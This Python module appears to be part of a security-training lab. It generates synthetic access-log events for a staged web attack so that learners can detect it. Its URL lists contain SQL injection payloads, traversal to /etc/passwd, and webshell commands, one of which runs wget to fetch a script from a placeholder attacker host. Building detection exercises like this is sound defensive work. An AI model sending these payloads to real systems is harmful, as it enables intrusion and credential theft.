"""Web attack scenario (endpoint: web-attack, also works on legacy-web).

Chronological simulation built from synthetic access-log events only -
no vulnerable application is deployed. External actors use documentation-
reserved addresses (RFC 5737):

  attackers        203.0.113.x  (TEST-NET-3)
  normal clients   10.0.100.x   (internal lab range)

Phases (see the expected alerts in exercises/teacher.md):
  A  normal browsing
  B  SQL injection attempts
  C  directory traversal attempts (one *successful* read)
  D  directory scanning (many 404s - repeated HTTP errors)
  E  application errors after injection (HTTP 500)
  F  possible successful compromise: upload + webshell access
"""

import time

ATTACKERS = ["203.0.113.10", "203.0.113.15", "203.0.113.66"]
NORMAL_CLIENTS = ["10.0.100.23", "10.0.100.31"]

SQLI_URLS = [
    "/products.php?id=1' OR '1'='1",
    "/search.php?q=1' UNION ALL SELECT username,password FROM users--",
    "/item.php?id=1 UNION SELECT 1,version(),database()--",
    "/api/v1/users?name=admin' AND SLEEP(5)--",
]
TRAVERSAL_URLS = [
    ("/download?file=../../../../../etc/passwd", 403),
    ("/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", 403),
    ("/static/../../../../etc/passwd", 200),  # successful read: compromise evidence
]
SCAN_URLS = [
    "/admin", "/backup.zip", "/wp-login.php", "/.git/config", "/phpmyadmin",
    "/config.php.bak", "/uploads/", "/server-status",
]
COMPROMISE_URLS = [
    ("/admin/upload.php", "POST", 200),
    ("/uploads/shell.php?cmd=cat%20/etc/passwd", "GET", 200),
    ("/uploads/shell.php?cmd=id", "GET", 200),
    ("/uploads/shell.php?cmd=wget%20http://203.0.113.15/tool.sh", "GET", 200),
]
NORMAL_URLS = ["/", "/products", "/static/style.css", "/api/v1/status"]


def _http(eng, srcip, method, url, status, evidence, bytes_=None):
    eng.emit(
        "http_request",
        srcip=srcip,
        method=method,
        url=url,
        status=status,
        bytes=bytes_ if bytes_ is not None else eng.rng.randint(400, 52000),
        result="simulated",
        evidence=evidence,
    )


def engage(eng, pause=0.0):
    n = 0
    attacker = eng.rng.choice(ATTACKERS)

    # A ---------------------------------------------------------------- normal
    for _ in range(8):
        _http(eng, eng.rng.choice(NORMAL_CLIENTS), "GET",
              eng.rng.choice(NORMAL_URLS), 200, "normal browsing")
        n += 1

    # B ------------------------------------------------------ SQL injection
    for url in SQLI_URLS:
        _http(eng, attacker, "GET", url, 500, "SQL injection attempt against product search")
        n += 1

    # C ---------------------------------------------------- directory traversal
    for url, status in TRAVERSAL_URLS:
        ev = "directory traversal attempt (blocked)" if status != 200 \
            else "directory traversal SUCCEEDED - /etc/passwd content returned"
        _http(eng, eng.rng.choice(ATTACKERS), "GET", url, status, ev)
        n += 1

    # D ---------------------------------------------------- scanning: many 404
    for url in SCAN_URLS:
        _http(eng, attacker, "GET", url, 404, "automated directory scanning")
        n += 1

    # E ----------------------------------------------- application errors 500
    for _ in range(4):
        _http(eng, attacker, "POST", "/search.php", 500,
              "repeated application error after injection attempts")
        n += 1

    # F ---------------------------------------- evidence of possible compromise
    for url, method, status in COMPROMISE_URLS:
        ev = ("successful upload to /admin (200) followed by command execution "
              "through an uploaded script - possible webshell")
        _http(eng, attacker, method, url, status, ev, bytes_=eng.rng.randint(2000, 400000))
        n += 1
        if pause:
            time.sleep(pause)

    # trailing normal noise
    for _ in range(3):
        _http(eng, eng.rng.choice(NORMAL_CLIENTS), "GET",
              eng.rng.choice(NORMAL_URLS), 200, "normal browsing")
        n += 1
    return n
